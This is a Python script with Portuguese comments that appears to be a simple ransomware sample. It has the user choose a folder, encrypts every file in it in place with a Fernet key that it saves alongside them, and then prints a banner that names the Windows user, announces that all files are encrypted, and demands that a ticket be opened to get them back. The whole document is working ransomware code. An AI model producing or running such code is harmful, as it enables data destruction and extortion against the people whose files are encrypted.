import os
import time
from cryptography.fernet import Fernet
from tkinter import Tk, filedialog
import win32api
from pyfiglet import Figlet

# Pegando nome do usuário
username = win32api.GetUserName()

def limpar_tela():
    os.system("cls" if os.name == "nt" else "clear")

def print_com_animacao(texto):
    for char in texto:
        print(char, end='', flush=True)
        time.sleep(0.01)
    print()

def animacao_aguarde(tempo_total, texto="Aguarde...", intervalo=0.5):
    start_time = time.time()
    while time.time() - start_time < tempo_total:
        print(texto, end='', flush=True)
        time.sleep(intervalo)
        print('\r' + ' ' * len(texto) + '\r', end='', flush=True)
        time.sleep(intervalo)

def escolher_pasta():
    root = Tk()
    root.withdraw()
    pasta = filedialog.askdirectory(title="Escolha a pasta com os arquivos")
    return pasta

def esta_criptografado(conteudo):
    return conteudo.startswith(b'ENCRYPTED:')

def adicionar_marcador(conteudo):
    return b'ENCRYPTED:' + conteudo

# Pede ao usuário para escolher a pasta
pasta_escolhida = escolher_pasta()

if not pasta_escolhida:
    print_com_animacao(" Nenhuma pasta foi escolhida. Encerrando o programa ".upper().center(70, '🔴'))
    exit()

todos_arquivos = []
arquivos_criptografados = []
arquivos_nao_criptografados = []

# Percorre os arquivos na pasta escolhida
for file in os.listdir(pasta_escolhida):
    if file in ["malware.py", "key.key", "decr.py"]:
        continue
    caminho_completo = os.path.join(pasta_escolhida, file)
    if os.path.isfile(caminho_completo):
        todos_arquivos.append(caminho_completo)

# Exibe todos os arquivos encontrados, um por linha
limpar_tela()
preview_text = Figlet(font='slant')
print(preview_text.renderText('ENCRYPTION'))
print("Arquivos encontrados:")
for arquivo in todos_arquivos:
    print(arquivo, sep='\n')

# Gera a chave de criptografia
chave = Fernet.generate_key()
with open(os.path.join(pasta_escolhida, "key.key"), "wb") as chave_arquivo:
    chave_arquivo.write(chave)

# Criptografa cada arquivo encontrado
fernet = Fernet(chave)
for file in todos_arquivos:
    try:
        with open(file, "rb") as arquivo:
            conteudo = arquivo.read()
        if esta_criptografado(conteudo):
            arquivos_criptografados.append(file)
        else:
            conteudo_encriptado = adicionar_marcador(fernet.encrypt(conteudo))
            with open(file, "wb") as arquivo:
                arquivo.write(conteudo_encriptado)
            arquivos_nao_criptografados.append(file)
    except Exception as e:
        print(f"Erro ao criptografar o arquivo {file}: {e}")

if arquivos_criptografados:
    print("\nArquivos já criptografados:")
    for arquivo in arquivos_criptografados:
        print(arquivo)
name = 'Verboten'
if arquivos_nao_criptografados:
    animacao_aguarde(tempo_total=5)
    print_com_animacao('\n' + f" Olá! Usuário {username} ".center(30, '*') + "\n")
    print_com_animacao(" TODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS ".upper().center(70, '🟠') + "\n")
    print_com_animacao(" PARA ACESSO NOVAMENTE. ABRA UM CHAMADO ".upper().center(50, '🟡') + "\n")
else:
    print_com_animacao(" Nenhum novo arquivo foi criptografado. ".upper().center(70, '🔴'))
